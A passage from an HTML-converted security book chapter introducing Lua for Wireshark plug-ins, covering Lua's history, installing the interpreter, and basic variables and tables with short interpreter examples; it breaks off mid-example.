>Plug-ins and other forms of application extensibility are usually made possible with an application programming interface (API). An API provides a means for other developers to quickly leverage existing components and produce new functionality. You can use a good API to</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section318" ><p class=MsoBodyText  style="margin-top:3.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >implement new functionality in a fraction of the time you would need to implement something from scratch or with the aid of regular programming libraries.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Up to only a few years ago, Wireshark users relied on such an API. What was known as the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Wireshark API </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >was the only way possible to create and add dissectors to Wireshark. This original plug-in API had to be programmed in C and thus required recompiling. And it was a constant source of security issues, as C is vulnerable to memory corruption when implemented incorrectly. Supporting a scripting language is a more flexible and modern solution, so Wireshark opted for Lua.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lua is a scripting language in that Lua code is read from a plain text script/source file and then executed by the Lua interpreter&#8212;a compiled executable itself&#8212;dynamically at runtime. Another word for scripting language is </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >interpreted </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >managed language</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Because the code is interpreted at runtime, and generally all memory access is managed by the runtime, Lua, in this case, is the interpreter. Being a managed language usually (but not always) means that common security vulnerabilities such as memory corruptions are less common, as developers are not directly responsible for managing memory access themselves (which is usually the cause for buffer overflow vulnerabilities, and so on). This may be confusing at first if don&#8217;t have a computer science or programming background. Ultimately, all you need to understand is that a plain text file you created can be executed immediately by Lua without having to be compiled first, as with other languages, such as C/C++.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:8.0000pt;margin-right:8.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lua was developed by Tecgraf, a computer technology group at the Pontifical Catholic University in Rio de Janeiro, Brazil. Today, Lua is managed by LabLua, part of the Department of Computer Science at PUC-Rio. Lua originated from two languages, Sol and DEL, both also developed at Tecgraf in the early 1990s. Both Sol and DEL were known as </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >data-descriptive languages </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and had limited value as scripting languages. However, both lacked the desired flow-control structures, so Lua was conceived out of necessity. Lua got international attention after the creators published a paper, and the language was featured in a <a name="_bookmark605" ></a>programming magazine. Currently, Lua is used in everything from</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section319" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >games to embedded systems and enterprise software.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark606" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Scripting Basics" ></a>Scripting Basics</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you&#8217;ve recently used one of the popular interpreted programming languages, such as Python or Perl, you should feel right at home using Lua. It is a language with runtime type checking, and variables do not need to be declared before use, like in many other scripting languages. This section describes some of the features you will use most while developing plug-ins for Wireshark and highlights cases where Lua differs from other programming languages.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:8.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To show the basics of Lua, we will show a piece of code for each of the building blocks you would regularly use, such as </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statements, loops, functions, and variables. Because we are going to be scripting with Lua in Wireshark, it is imperative that you gain a foundation in the Lua language itself. In the following paragraphs, each element is highlighted to explain the quirks or pitfalls of the language. Once you have a foundation, we move into Lua and Wireshark specifics. You will use your newfound Lua skills and understanding of the Wireshark Lua API to start programming some simple scripts that demonstrate how to use the command-line TShark, as well as play with GUI elements in the Wireshark application. By the end of this chapter, you will be pulling files from network captures and writing your own custom dissector to examine a custom protocol.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:10.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you want to try any of the basic snippets of Lua that follow in this</span><span><a href="#_bookmark608" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;section, it is best if you use the interactive Lua interpreter (see </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >8-1</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). You can start the interactive interpreter by simply executing the</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;Lua binary without arguments. Getting the Lua binary differs depending on what platform you are on. For Windows, you can grab them from LuaBinaries sourceforge at </span><span><a href="http://sourceforge.net/projects/luabinaries/files/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >http://sourceforge.net/projects/luabinaries/files/</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Download just the Lua binaries, which can be found under the Executables folder of the version of Lua you want to download. You should probably try to download a version of Lua that matches the version that Wireshark as well as your operating system architecture use. Refer to the section Checking for Lua Support for information on how to identify the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section320" ><p class=MsoBodyText  style="margin-top:3.9500pt;margin-right:12.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >version of Lua used by your Wireshark installation. For example, if you want to download Lua 5.3 for Windows x86, you would download the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >lua-5.3_Win32_bin.zip </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file. Once downloaded, unzip this file to a directory that will now contain various Lua binaries. The one you are interested in is the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >lua52.exe </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file, which is the Lua interpreter, and it gives you an interactive shell in which to program.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="783"  height="394"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker398787.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.1000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark608" ></a><span><a href="#_bookmark607" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Lua Interactive Interpreter</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="223"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker398861.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can use the package manager for your Linux distribution of choice to install Lua the easy way. For Debain-based operating systems, such as Kali Linux, you use the command </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >apt-get install lua5.3</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to install Lua 5.3. In the following Linux example, you can see how executing a statement immediately shows the output. Using the interactive interpreter gives immediate feedback to your input, so you can quickly test behavior in Lua if you are uncertain how to phrase something in</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section321" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >this new language.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~$ lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >5.3.3</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Copyright (C) 1994-2016 Lua.org,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PUC-Rio</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:375.1500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l13 level1 lfo22;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"test" test</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="367"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker399451.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:8.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.3500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Variables</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><a name="_bookmark610" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A variable can be assigned by using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >= </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >operator. It does not have to be explicitly defined before use. If you reference a variable by trying to use it in an expression, like printing a variable to the screen, before assigning it a value, it returns the special value </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >nil</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Nil is like </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >NULL</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, or undefined, in other languages. Lua has seven other basic types: Boolean, number, string, userdata, function, thread, and table.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Boolean values are </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >True </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >False</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, whereas number is like an integer and floats in other languages combined into one. Both 4 and 4.5 are numbers in Lua. The string type is just what it sounds like; for example, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Hello World</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is an example of a string. The last and probably the most important type is tables. These are incredibly flexible, and from a high-level act like an array/list as a hash/dictionary in other languages. For example, try the following in your Lua shell:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.6500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62; t_table = {11,12,13,14,15,15}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print(t_table[1])</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section322" ><p class=MsoNormal  style="margin-top:3.6000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >11</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0500pt;margin-right:339.1500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >print(t_table[2]) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >12</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Here you see a table that acts as an array. This table is indexed using a number that assigns to the position of the values within the table.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:8.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Notice that Lua attempts to make computer science majors cringe, as it doesn&#8217;t start counting an array by 0, which is common in</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >computing, but instead starts indexing at 1. Also, if you try an out-of-bounds index number, like 0 or 20, in the previous example, Lua returns </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >nil</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. This is important to remember when you check for the existence of values within the array, because some languages throw an exception instead of returning a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >null</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >value.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You have seen how a table can be treated as an array, but we also mentioned it could be used as a hash/dictionary. Check out the following excerpt from the Lua interpreter to see how that is done:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:12.1000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >t_table = {foo = "bar", bar="baz", baz =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.9000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"biz"}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:310.4000pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >print(t_table["foo"]) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >bar</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:310.4000pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >print(t_table["bar"]) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >baz</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:331.9500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >print(t_table.foo) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >bar</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  